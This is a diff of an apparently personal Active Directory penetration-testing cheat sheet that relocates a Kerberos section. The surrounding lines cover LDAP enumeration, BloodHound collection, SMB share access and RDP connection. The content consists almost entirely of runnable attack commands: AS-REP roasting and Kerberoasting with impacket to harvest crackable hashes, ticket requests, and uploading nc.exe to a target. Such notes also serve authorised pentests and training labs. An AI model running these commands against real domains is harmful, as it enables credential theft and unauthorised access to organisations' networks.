@@ -56,40 +56,6 @@ ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep
 ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "" -s base "(objectClass=*)" | grep -v 'supported'
 ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
 
-[*] Kerberos
-impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET
-impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $DC
-
-nano ./custom_krb5.conf
-
-[libdefaults]
-    default_realm = $KRB5DOM
-    dns_lookup_realm = true
-    dns_lookup_kdc = true
-
-[realms]
-    $KRB5DOM = {
-        kdc = $DC
-        admin_server = $DC
-        default_domain = $DC
-    }
-
-[domain_realm]
-    $DOM = $KRB5DOM
-    .$DOM = $KRB5DOM
-
-export KRB5_CONFIG="$PWD/custom_krb5.conf"
-
-export KRB5CCNAME="$PWD/$USERNAME@SPN@$KRB5DOM.ccache"
-kinit -c "$PWD/$USERNAME@SPN@$KRB5DOM.ccache" '$USERNAME@$KRB5DOM'
-klist
-
-impacket-GetADUsers -dc-host $DC -k $DOM/
-impacket-GetNPUsers -usersfile usernames $DOM/ -dc-ip "$TARGET"
-impacket-GetUserSPNs -request-user '$USERNAME' -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
-impacket-GetUserSPNs -no-preauth '$USERNAME' -usersfile usernames -dc-host "$TARGET" $DOM/
-impacket-GetUserSPNs -request -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
-
 [*] bloodhound-python
 bloodhound-python -c all -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
 bloodhound-python -c default -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
@@ -296,6 +262,37 @@ upload nc.exe
 impacket-smbclient $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 shares
 use
+
+[*] Kerberos
+export KRB5_CONFIG="$PWD/custom_krb5.conf"
+nano ./custom_krb5.conf
+[libdefaults]
+    default_realm = $KRB5DOM
+    dns_lookup_realm = true
+    dns_lookup_kdc = true
+
+[realms]
+    $KRB5DOM = {
+        kdc = $DC
+        admin_server = $DC
+        default_domain = $DC
+    }
+
+[domain_realm]
+    $DOM = $KRB5DOM
+    .$DOM = $KRB5DOM
+
+impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET
+impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $DC
+impacket-GetADUsers -dc-host $DC -k $DOM/
+impacket-GetNPUsers -usersfile usernames $DOM/ -dc-ip "$TARGET"
+impacket-GetUserSPNs -request-user '$USERNAME' -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
+impacket-GetUserSPNs -no-preauth '$USERNAME' -usersfile usernames -dc-host "$TARGET" $DOM/
+impacket-GetUserSPNs -request -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
+
+export KRB5CCNAME="$PWD/$USERNAME@SPN@$KRB5DOM.ccache"
+kinit -c "$PWD/$USERNAME@SPN@$KRB5DOM.ccache" '$USERNAME@$KRB5DOM'
+klist
 
 [*] RDP
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
